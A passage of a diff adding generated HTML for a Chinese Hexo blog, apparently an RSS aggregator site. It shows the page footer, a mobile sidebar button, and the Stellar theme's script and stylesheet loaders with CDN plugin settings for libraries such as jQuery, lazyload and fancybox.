class="item" href="/rss/eb45da06.html" title="Re @FGRibreau"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://picsum.photos/400/300?random=1251"></div><span class="title">Re @FGRibreau</span></a></div></section></div>
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs14">RSS</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a></div><div class="sitemap-group"><span class="fs14">Support</span><a target="_blank" rel="noopener" href="https://blog.mhuig.top/">博客</a><a target="_blank" rel="noopener" href="https://api.mhuig.top/">API</a><a target="_blank" rel="noopener" href="https://ssl.mhuig.top/">SSL Status</a><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mhuig.instatus.com/">Status Monitors</a></div><div class="sitemap-group"><span class="fs14">社交</span><a target="_blank" rel="noopener" href="https://blog.mhuig.top/pages/friends/">友链</a><a target="_blank" rel="noopener" href="https://blog.mhuig.top/pages/about/">留言板</a></div><div class="sitemap-group"><span class="fs14">更多</span><a target="_blank" rel="noopener" href="https://mhuig.top/">关于我</a><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/MHuiG">GitHub</a><a href="/contact/">Contact</a><a href="/privacy-policy/">隐私政策</a></div></div><div class="text"><p>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/me-shaon/GLWTPL/blob/master/translations/LICENSE_zh-CN">GLWT（Good Luck With That，祝你好运）公共许可证</a> 许可协议，转载请注明出处。</p>
+<p>本站由 <a href="https://rssbox.mhuig.top/">@MHuiG</a> 创建，使用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a> 作为主题，您可以在 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/MHG-LAB/RSSBOX">GitHub</a> 找到本站源码。</p>
+</div></footer>
+
+      <div class="float-panel mobile-only blur" style="display:none">
+  <button type="button" class="sidebar-toggle mobile" onclick="sidebar.toggle()">
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewbox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"/><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"/></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class="scripts">
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://static.mhuig.top/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://static.mhuig.top/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://static.mhuig.top/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://static.mhuig.top/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://static.mhuig.top/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://static.mhuig.top/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://static.mhuig.top/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img,article.content img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti/umd/heti.min.css","js":"https://unpkg.com/heti/umd/heti-addon.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
